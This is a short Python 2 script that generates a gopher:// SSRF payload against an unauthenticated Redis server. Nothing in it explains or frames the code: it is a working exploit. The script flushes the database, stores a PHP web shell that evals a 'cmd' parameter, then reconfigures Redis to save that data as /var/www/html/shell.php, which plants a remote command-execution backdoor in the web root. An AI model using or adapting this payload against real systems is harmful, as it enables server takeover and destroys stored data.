import urllib

redis_ip = "172.20.x.x"
redis_port = "6379"
shell = "\n\n<?php eval($_GET[\"cmd\"]);?>\n\n"
filename = "shell.php"
path = "/var/www/html"
passwd = ""
cmd=["flushall",
     "set 1 {}".format(shell.replace(" ","${IFS}")),
     "config set dir {}".format(path),
     "config set dbfilename {}".format(filename),
     "save"
     ]
if passwd:
    cmd.insert(0, "AUTH {}".format(passwd))

def redis_format(arr):
    CRLF = "\r\n"
    redis_arr = arr.split(" ")
    cmd = ""
    cmd += "*" + str(len(redis_arr))
    for x in redis_arr:
        cmd += CRLF + "$" + str(len((x.replace("${IFS}", " ")))) + CRLF + x.replace("${IFS}", " ")
    cmd += CRLF
    return cmd

if __name__=="__main__":
    payload = "gopher://" + redis_ip + ":" + redis_port + "/_"
    for x in cmd:
        payload += urllib.quote(redis_format(x))
    print urllib.quote(payload)
    
